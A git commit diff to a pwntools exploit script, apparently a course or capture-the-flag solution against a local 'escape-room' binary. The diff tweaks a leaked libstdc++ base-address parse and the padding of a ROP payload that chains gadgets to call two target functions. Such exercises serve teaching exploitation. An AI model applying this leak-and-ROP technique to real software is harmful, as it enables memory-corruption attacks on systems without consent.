eae3c36e8282b5e5bb77a6d44278528534406623
ChoKyuWon <yyj10137@gmail.com>
2020-06-06 03:11:02 +0900

    escape.py

--- escape.py
+++ escape.py
@@ -6,7 +6,9 @@ switch2 = 0x08052004 #on = "SWE3025"
 button1 = 0x08049276
 button2 = 0x08049311
 
-p = process("../../escape-room/escape-room")
+
+path = "escape-room"
+p = process(path)
 
 p.recvuntil(">>>")
 p.sendline('5')
@@ -14,12 +16,13 @@ s = p.recvuntil(">>>").decode().split('\n')
 for line in s:
     if "libstdc++.so.6" in line:
         index = s.index(line)
-        base = s[index+1].split(':')[1][1:10]
+        base = s[index+1].split(':')[1][1:11]
         break
+
 mov = p32(int(base,16) + 0x9b55a) #mov dword ptr [esi], edi; pop ebx; pop esi; pop edi; ret
 pop = p32(int(base,16) + 0x9b55d) #pop esi; pop edi; ret
 ROP = mov
-payload = b'\x90'*16 + ROP + p32(button1) + p32(button2)
+payload = b'\x90'*28 + ROP + p32(button1) + p32(button2)
 
 p.sendline('6')
 print(p.recvuntil(">>>"))
